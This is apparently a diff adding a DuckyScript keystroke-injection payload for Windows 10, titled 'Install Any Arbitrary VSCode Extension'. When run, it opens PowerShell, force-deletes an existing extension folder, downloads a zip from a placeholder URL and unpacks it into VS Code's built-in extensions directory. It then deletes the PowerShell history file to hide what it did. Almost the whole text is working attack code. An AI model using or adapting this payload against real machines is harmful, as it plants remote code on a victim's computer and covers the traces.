@@ -1,0 +1,82 @@
+REM ##########################################################
+REM #                                                        #
+REM # Title        : Install Any Arbitrary VSCode Extension  #
+REM # Author       : Aleff                                   #
+REM # Version      : 1.0                                     #
+REM # Category     : Execution                               #
+REM # Target       : Windows 10                              #
+REM #                                                        #
+REM ##########################################################
+
+DELAY 2000
+GUI r
+DELAY 1000
+STRING PowerShell
+ENTER
+DELAY 1000
+
+STRING $extensionsPath = "$env:USERPROFILE\AppData\Local\Programs\Microsoft VS Code\resources\app\extensions\
+
+REM Replace “#EXTENSION_NAME” with the name of the extension folder to check if it already exists in order to delete it
+STRING #EXTENSION_NAME
+
+STRING "
+ENTER
+
+STRING if (Test-Path -Path $extensionsPath -PathType Container) {
+ENTER
+DELAY 250
+STRING     Remove-Item -Recurse -Force -Path $extensionsPath
+ENTER
+DELAY 250
+STRING }
+ENTER
+DELAY 250
+
+REM Replace “https://example.com/path/to/NewExtension.zip” with the link to the zipper archive containing the extension you want to install
+STRING $url = "https://example.com/path/to/NewExtension.zip"
+ENTER
+DELAY 250
+
+REM It will download within a temporary folder and only after downloading will it be extracted to the extensions folder
+STRING $downloadPath = "$env:TEMP\NewExtension.zip"
+ENTER
+DELAY 250
+STRING $extractPath = "$env:USERPROFILE\AppData\Local\Programs\Microsoft VS Code\resources\app\extensions\
+ENTER
+DELAY 250
+
+REM Replace again "#EXTENSION_NAME" with the official extension name
+STRING #EXTENSION_NAME
+ENTER
+DELAY 250
+
+STRING "
+ENTER
+DELAY 250
+
+STRING Invoke-WebRequest -Uri $url -OutFile $downloadPath
+ENTER
+DELAY 250
+
+REM Check if the file was downloaded correctly
+STRING if (Test-Path -Path $downloadPath) {
+ENTER
+DELAY 250
+
+REM Extract the contents of the zipper file into the extensions directory
+STRING Expand-Archive -Path $downloadPath -DestinationPath $extractPath -Force
+ENTER
+DELAY 250
+
+STRING Remove-Item -Path $downloadPath -Force
+ENTER
+DELAY 250
+
+REM Clear the command history in PowerShell by deleting the history file
+STRING Remove-Item (Get-PSReadlineOption).HistorySavePath; exit
+ENTER
+DELAY 250
+
+STRING }
+ENTER
